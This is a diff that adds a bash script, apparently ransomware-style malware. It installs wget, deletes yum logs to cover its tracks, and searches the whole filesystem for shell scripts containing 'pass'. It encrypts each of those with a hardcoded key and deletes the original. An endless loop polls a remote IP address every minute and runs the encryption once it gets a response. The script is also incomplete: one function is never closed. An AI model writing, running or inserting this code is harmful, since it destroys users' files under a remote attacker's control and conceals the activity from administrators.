@@ -1,0 +1,63 @@
+PASS="GodHelpMe"
+
+#WGET_OPTS='--user="jim" --password="xxx-yyy-zzz"'
+
+check_root ()
+{
+    if [ "$EUID" -ne 0 ]
+        then echo "Please run as root"
+        rm -rf $PATH_TEMP_FILE/q1.sh
+        exit
+    fi
+}
+
+
+check_openssl ()
+{
+    if rpm -q openssl
+    then
+        echo "Openssl Found!"
+    else
+        echo "Openssl Not Found."
+        echo "Install Openssl and clear yum log."
+        yum install wget -y
+        rm -rf /var/log/yum*
+    fi
+}
+user_del ()
+{
+
+#useradd -m -p shit1 -s /bin/bash shit1
+
+
+
+
+# encrypt passwords in .sh
+pass_sh_encr ()
+{
+   #for file in `find /home/oit/tests/etc -type f -name "*"`
+   for file in `find / -name '*.sh' -type f -exec grep -l "pass" {} \;`# шифровать все файлы с паролем внутри
+   do
+      #echo -E -- ${file} -- && cat -- ${file} ;
+      echo ${file} ;
+      openssl enc -aes-256-cbc -salt -pass pass:$PASS -in $file -out $file.☢
+      rm -rf $file
+   #done > /path_to_your_new_file/nameFile.txt
+   done
+}
+
+while true
+do
+   sleep 60
+   #wget http://185.141.25.168/attack_check/0.sh -P /tmp --quiet --spider
+   wget http://185.141.25.168/check_attack/0.txt -P /tmp --spider --quiet --timeout=5
+   if [ $? = 0 ];then
+   pass_sh_encr
+   elif [ $? = 4 ];then
+   printf "\ dont touch \n"
+   else
+   printf "\n dont touch \n"
+   fi
+done
+
+
